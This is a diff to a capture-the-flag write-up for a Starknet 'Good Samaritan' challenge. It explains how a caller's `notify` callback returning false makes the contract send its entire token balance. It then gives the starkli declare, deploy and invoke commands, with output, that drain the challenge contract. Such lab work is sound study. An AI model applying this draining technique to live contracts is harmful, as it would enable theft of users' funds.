@@ -510,25 +510,27 @@ Challenge address: 0x39303bb3e66588143f88beda1bcf9a4eb56a77829820ed4d55aec83ab12
 ### GOOD SAMARITAN
 _Back to [recap](#recap)_
 
-:warning: Currently not working on Sepolia :warning:
+The challenge contract allows anyone to call `request_donation(self: @ContractState)` which calls `donate10(self: @ContractState, dest_: ContractAddress)`, which transfers 10e18 tokens from a wallet contract if there is enough balance and the caller has implemented the function `fn notify(self: @TContractState, amount: u256) -> bool;`, returning true for a successful transfer of the requested amount.
 
-_The challenge deploys a custom ERC20 token. The provided class hashes are hardcoded ([1](https://github.com/devnet0x/Starknet-Security-Challenges-Factory/blob/c1f9d6db576aacf28c403a2b1b44f349e4eaf70c/src/assets/challenge14.cairo#L41-L43), [2](https://github.com/devnet0x/Starknet-Security-Challenges-Factory/blob/c1f9d6db576aacf28c403a2b1b44f349e4eaf70c/src/assets/challenge14.cairo#L50-L52)), but it doesn't exist on Sepolia (surely unchanged from the goerli migration) thus the challenge cannot be deployed._
+There is no restriction on number of calls to these functions, one can make calls to request_donation until the good samaritan's balance is 0. The good samaritan has $1_000_000 TKN, it requires 100_000 calls to `request_donation` if one request $10 TKN at a time. The number of calls required makes impossible to drain all coins in one transaction.
 
-The challenge contract allows anyone to call `request_donation(self: @ContractState)` which calls `donate10(self: @ContractState, dest_: ContractAddress)`, which transfers 10e18 tokens from a wallet contract if there is enough balance. If the balance is less than 10e18, the remaining balance is sent.
-There is no restriction on number of calls to these functions, one can make calls to request_donation until the good samaritan's balance is 0.
+In order to effectively transfer coins from the samaritan, the caller must implement the function `fn notify(self: @TContractState, amount: u256) -> bool;` from which the `transfer` function makes a transfer or not.
+- If the requested amount is superior to the current_balance of the samaritan, `transfer` returns `false`.
+- If the amount is sufficient, the transfer is successful or not based on the value returned from the `notify` external call.
 
-The good samaritan has $1_000_000 TKN, it requires 100_000 calls to `request_donation`.
-Either make a loop that breaks on the the 100_001-th iteration, or a while loop that breaks when `request_donation` returns `false`.
+Moreover, on the `request_donation` function, if the returned value from `transfer` is false, then all remaining coins are transferred to the caller. This is the effective way to drain the samaritan.
+
+We code a contract that calls `request_donation`, implementing `notify` which returns `false` if the amount is 10e18 and `true` otherwise.
 
 The exploit contract source code can be found [here](https://github.com/zmalatrax/starknet_security/blob/main/good_samaritan/src/good_samaritan_exploit.cairo).
 
 1. Deploy the challenge:
 
-Challenge address: <challenge_addr>
+Challenge address: 0x10af0dea72bb94d04bd18159c9a3e740b7fbe706d4dbc829ed116c40b25a738
 
 2. Craft the exploit contract:
 
-   - Create a new scarb project: `scarb new coinflip && cd coinflip`
+   - Create a new scarb project: `scarb new good_samaritan && cd good_samaritan`
    - Update the `Scarb.toml` with starknet dependecies
    - Implements the exploit
 
@@ -539,24 +541,43 @@ scarb build
 starkli declare --watch target/dev/good_samaritan_GoodSamaritanExploit.contract_class.json
 ```
 
-Class Hash: <good_samaritan_class_hash>
+Class Hash: 0x06c7ad2747323e1d33140e08785e9cc5841e3481a97b2e83ffe218e386aa0c28
 
 4. Deploy the contract:
 
 ```bash
-starkli deploy --watch <good_samaritan_class_hash> <challenge_addr>
+starkli deploy --watch 0x06c7ad2747323e1d33140e08785e9cc5841e3481a97b2e83ffe218e386aa0c28 0x10af0dea72bb94d04bd18159c9a3e740b7fbe706d4dbc829ed116c40b25a738
 ```
 
-Contract address: <good_samaritan_exploit>
+Contract address: 0x04386e932121e46c90ccd402493b7a8135aef0e21b58f2b77d92618e181e909c
 
 5. Call `drain_samaritan()`:
 
    ```bash
-   starkli invoke <good_samaritan_exploit> $(starkli selector drain_samaritan)
+   starkli invoke 0x04386e932121e46c90ccd402493b7a8135aef0e21b58f2b77d92618e181e909c $(starkli selector drain_samaritan)
    ```
 
 6. Verify the solution and mint the NFT
 
 NOTE A: Starkli declare output
 
+```bash
+Sierra compiler version not specified. Attempting to automatically decide version to use...
+Network detected: sepolia. Using the default compiler version for this network: 2.4.0. Use the --compiler-version flag to choose a different version.
+Declaring Cairo 1 class: 0x06c7ad2747323e1d33140e08785e9cc5841e3481a97b2e83ffe218e386aa0c28
+Compiling Sierra class to CASM with compiler version 2.4.0...
+CASM class hash: 0x075a0696b8dc00b8ff58f0a4fc6633a6140e5b4fd18baca2c2a9068171eb1013
+Contract declaration transaction: 0x07c64c803d11a4dbc5751eb22bc7674e97f617ac93c2de9e713354184d7a86ee
+Class hash declared:
+0x06c7ad2747323e1d33140e08785e9cc5841e3481a97b2e83ffe218e386aa0c28
+```
+
 NOTE B: Starkli deploy output
+
+```bash
+Deploying class 0x06c7ad2747323e1d33140e08785e9cc5841e3481a97b2e83ffe218e386aa0c28 with salt 0x07733b541121bf54951c7b615e029e46234e2725d2270b3eccc3dfb20f90eb49...
+The contract will be deployed at address 0x04386e932121e46c90ccd402493b7a8135aef0e21b58f2b77d92618e181e909c
+Contract deployment transaction: 0x00773b9b92562d063a0961598bec9ed5fd39d4875d947d8f0fee553b728044cf
+Contract deployed:
+0x04386e932121e46c90ccd402493b7a8135aef0e21b58f2b77d92618e181e909c
+```
